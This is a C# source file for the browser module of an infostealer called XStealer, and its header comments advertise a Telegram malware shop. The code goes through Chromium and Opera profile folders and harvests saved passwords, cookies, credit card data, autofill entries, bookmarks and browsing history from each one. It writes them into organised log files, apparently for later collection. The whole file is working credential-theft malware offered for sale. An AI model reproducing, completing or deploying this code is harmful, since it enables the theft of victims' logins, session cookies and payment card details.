// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Browsers.Chromium
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using Helpers;

    public static class CEngine
    {
        public static void GetData()
        {
            // Перебираем все пути
            for (int i = 0; i < CBrowserPaths.ChromiumPaths.Length; i++)
            {
                string ChromePath = CBrowserPaths.ChromiumPaths[i];
                // Поиск отдельно Opera от других браузеров
                string sFullPath = ChromePath.Contains("Opera") ? string.Concat(GlobalPaths.AppData, ChromePath) : string.Concat(GlobalPaths.LocalAppData, ChromePath);
                if (Directory.Exists(sFullPath))
                {
                    try
                    {
                        foreach (string DirBrowser in Directory.EnumerateDirectories(sFullPath))
                        {
                            #region Passwords Data | Данные Паролей
                            List<Structures.Password_Chromium> data = CDataStruct.ReadDataLogins(GlobalPaths.CombinePath(DirBrowser, "Login Data"), CBrowserPaths.GetName(ChromePath));
                            CFormatLog.WritePasswords(data, "Passwords.txt"); // Для записи в один файл
                            #endregion

                            #region Cookies Data | Данные Кукисов
                            List<Structures.Cookie_Chromium> dataCookie = CDataStruct.ReadDataCookies(GlobalPaths.CombinePath(DirBrowser, "Cookies"));
                            CFormatLog.WriteCookies(dataCookie, $"Cookies/Chromium_{CBrowserPaths.GetName(ChromePath)}.txt");                  
                            #endregion

                            #region Credits Data | Данные Кредиток
                            List<Structures.CreditCard_Chromium> dataCredits = CDataStruct.ReadDataCredits(GlobalPaths.CombinePath(DirBrowser, "Web Data"));
                            CFormatLog.WriteCreditCards(dataCredits, $"Credits/Chromium_{CBrowserPaths.GetName(ChromePath)}.txt");                 
                            #endregion

                            #region Bookmarks Data | Данные Закладок
                            List<Structures.Bookmark_Chromium> dataBookmarks = CDataStruct.ReadDataBookmarks(GlobalPaths.CombinePath(DirBrowser, "Bookmarks"));
                            CFormatLog.WriteBookmarks(dataBookmarks, $"Bookmarks/Chromium_{CBrowserPaths.GetName(ChromePath)}.txt");              
                            #endregion

                            #region AutoFill Data | Данные Автозаполнения
                            List<Structures.AutoFill_Chromium> dataAutofill = CDataStruct.ReadDataAutoFill(GlobalPaths.CombinePath(DirBrowser, "Web Data"));
                            CFormatLog.WriteAutoFill(dataAutofill, $"AutoFills/Chromium_{CBrowserPaths.GetName(ChromePath)}.txt");
                            #endregion

                            #region Browser History Data | Данные Истории Браузера
                            List<Structures.History_Chromium> dataHistory = CDataStruct.ReadDataHistory(GlobalPaths.CombinePath(DirBrowser, "History"));
                            CFormatLog.WriteHistory(dataHistory, $"Histories/Chromium_{CBrowserPaths.GetName(ChromePath)}.txt");
                            #endregion
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                }
            }
        }
    }
}